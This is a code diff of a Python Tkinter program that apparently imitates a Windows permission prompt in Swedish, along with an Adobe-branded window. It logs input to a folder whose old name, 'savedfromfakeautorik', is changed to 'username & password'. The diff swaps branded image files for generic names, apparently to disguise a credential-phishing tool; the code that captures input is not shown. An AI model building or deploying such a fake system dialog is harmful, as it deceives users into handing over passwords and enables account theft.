@@ -18,7 +18,7 @@ root = Tk()
 root.attributes("-fullscreen", True)  # Set window to full screen
 
 # Load image and create a background canvas to display it
-image_bg = Image.open("ante - cbt.jpg")
+image_bg = Image.open("background.jpg")
 width, height = root.winfo_screenwidth(), root.winfo_screenheight()
 image_bg = image_bg.resize((width, height))
 photo_bg = ImageTk.PhotoImage(image_bg)
@@ -59,7 +59,7 @@ label = Label(root, text="ändringar på enheten?", font=("Segoe UI", 14), fg="b
 label.place(x=475, y=228)
 
 # Load image and create a label to display it
-image = Image.open("Ps - kopia.png")
+image = Image.open("app logo.png")
 image = image.resize((50, 50))
 photo = ImageTk.PhotoImage(image)
 label = Label(root, image=photo, borderwidth=0, highlightthickness=0)
@@ -448,7 +448,7 @@ def log(message):
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
 
         # Create the log directory if it doesn't exist
-        log_dir = "savedfromfakeautorik"
+        log_dir = "username & password"
         if not os.path.exists(log_dir):
             os.makedirs(log_dir)
 
@@ -558,10 +558,10 @@ def create_new_window():
     new_window.configure(bg="#ffffff")
     
     # set the windows icon
-    new_window.iconbitmap('adobe.ico')
+    new_window.iconbitmap('app logo ico.ico')
 
     # Load image and create a label to display it
-    image = Image.open("adobe.png")
+    image = Image.open("app logo long.png")
     image = image.resize((170, 80))
     photo = ImageTk.PhotoImage(image)
     label = Label(new_window, image=photo, borderwidth=0, highlightthickness=0)
